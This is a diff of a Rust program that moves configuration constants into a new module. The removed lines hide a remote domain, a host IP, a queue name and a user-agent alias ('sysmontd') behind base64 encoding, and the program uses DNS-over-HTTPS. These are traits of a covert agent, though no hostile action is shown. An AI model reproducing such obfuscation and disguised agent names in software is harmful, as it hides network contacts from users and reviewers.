@@ -31,6 +31,7 @@ use std::{
 
 #[macro_use]
 mod macros;
+mod constant;
 mod crypto;
 mod doh;
 mod tcp_extras;
@@ -47,7 +48,8 @@ use socket2::SockRef;
 use tcp_extras::TcpExtras;
 
 use crate::{
-    crypto::{decode_b64_string, decrypt},
+    constant::{AGENT, BASE_DOMAIN, BASE_URL, DEF_HOST, DEF_QUEUE},
+    crypto::decrypt,
     doh::resolve_doh,
     types::{Job, LogLevel},
 };
@@ -71,15 +73,6 @@ static WORKER_KEY: LazyLock<String> = LazyLock::new(|| {
 });
 
 static JOBS_COMPLETED: AtomicUsize = AtomicUsize::new(0);
-
-static BASE_DOMAIN: LazyLock<String> =
-    LazyLock::new(|| decode_b64_string("YXBpLnByZWNvbm5lY3QuYXBw").expect("ib"));
-static BASE_URL: LazyLock<String> = LazyLock::new(|| format!("https://{}", BASE_DOMAIN.as_str()));
-static ALIAS: LazyLock<String> = LazyLock::new(|| decode_b64_string("c3lzbW9udGQ=").expect("ia"));
-static AGENT: LazyLock<String> = LazyLock::new(|| format!("{}/1.0", ALIAS.as_str()));
-static DEF_HOST: LazyLock<String> =
-    LazyLock::new(|| decode_b64_string("MTcyLjE2LjAuMTEx").expect("ih"));
-static DEF_QUEUE: LazyLock<String> = LazyLock::new(|| decode_b64_string("c2VjdXJl").expect("iq"));
 
 const DEF_PORT: u16 = 515;
 const NUL: [u8; 1] = [0u8];
